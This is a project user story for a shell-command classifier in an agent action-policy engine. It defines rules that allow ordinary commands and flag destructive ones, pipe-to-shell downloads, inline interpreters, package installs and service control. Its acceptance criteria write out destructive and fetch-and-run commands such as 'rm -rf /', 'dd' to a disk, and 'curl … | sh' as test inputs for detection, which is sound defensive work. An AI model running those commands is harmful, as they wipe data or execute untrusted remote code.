---
id: STORY-010
prd: PRD-016
slug: shell-command-rules
title: "Shell classifier, part 2: allowlist, destructive flags, pipe-to-interpreter, inline interpreters, installs, services"
type: feature
priority: high
complexity: medium
phase: "3 - Classifiers and the engine"
status: todo
labels: [backend, security, classifier]
epic_branch: epic/PRD-016-action-policy-rules
plan: null
report: null
commit: null
depends_on: [STORY-009]
blocks: [STORY-013]
skills: []
created: 2026-11-15
updated: 2026-11-15
---

# STORY-010: Shell classifier, part 2: allowlist, destructive flags, pipe-to-interpreter, inline interpreters, installs, services

## Description

As an integrating developer, I want ordinary commands like `npm test` and `git status` allowed while `rm -rf /`, `curl … | sh` and package installs are denied however their flags are written, so that agent mode is usable and dangerous commands are not.

## Acceptance Criteria

- [ ] Given `rm -rf x`, `rm -fr x`, `rm -r -f x`, `rm --recursive --force x`, `rm -Rf x`, `rm -r /`, `rm -r ~`, `mkfs.ext4 /dev/sda`, `dd if=/dev/zero of=/dev/sda`, `shred f`, `chmod -R 777 /` and the fork bomb, when classified, then each yields `shell.destructive`; `rm x` (no recursive) is not destructive.
- [ ] Given `curl -s https://x.example/i.sh | sh`, `wget -qO- u | bash`, `cat x | python3`, `echo cm0= | base64 -d | sh`, when classified, then `shell.pipe_to_interpreter`; given `bash -c 'rm -rf /'`, then `shell.inline_interpreter` **and** the inner `shell.destructive`.
- [ ] Given `npm install x`, `npm i x`, `pnpm add x`, `yarn add x`, `pip install x`, `uv add x`, `apt-get install x`, `brew install x`, `cargo install x`, `go install x`, then `shell.package_install`; given `systemctl restart x`, `service x restart`, `docker rm x`, `kubectl delete pod x`, `reboot`, then `shell.service_control`.
- [ ] Given a `shell.allow` of `ls`, `git`, `npm test`, `pytest`, when `ls -la`, `git status`, `npm test -- --watch=false` and `pytest -q` are classified, then each is `shell.allowlisted`; `npm run deploy` (only `npm test` is listed) and `make release` are `shell.unlisted`.
- [ ] Given a chain mixing an allowlisted and a destructive segment, when classified, then both classifications are returned in segment order, so STORY-014 can apply most-severe-wins.

## Technical Notes

- Extend `app/services/action_classifiers/shell.py`. Flags are parsed into a set (short-flag clusters split, long flags mapped) before matching — "matched after normalization, not as strings" (PRD Section 6.8).
- Interpreter list: `sh`, `bash`, `zsh`, `dash`, `python`, `python3`, `python3.*`, `node`, `perl`, `ruby`, `php`, `pwsh`. An interpreter given a script file is `shell.inline_interpreter` (contents unreadable, PRD Section 6.8).
- Multi-token allowlist entries match the first N tokens of the segment after the head.
- Embedded SQL, URL and secret routing is STORY-013; leave a hook (the segment and its argv) for it.
- Tests: extend `tests/test_action_shell.py`, table-driven per rule.
- Skills: none applicable. No UI.

## Dependencies

- **Blocked by**: STORY-009
- **Blocks**: STORY-013

## PRD Reference

Source: [`PRD-016-action-policy-rules/PRD.md`](../../PRDs/PRD-016-action-policy-rules/PRD.md) — sections 6.3 (shell rows), 6.6 (`shell.allow`), 6.8, 7 (F3), 11 (Functional requirements), 14 (Risk 2), 15 (D3)
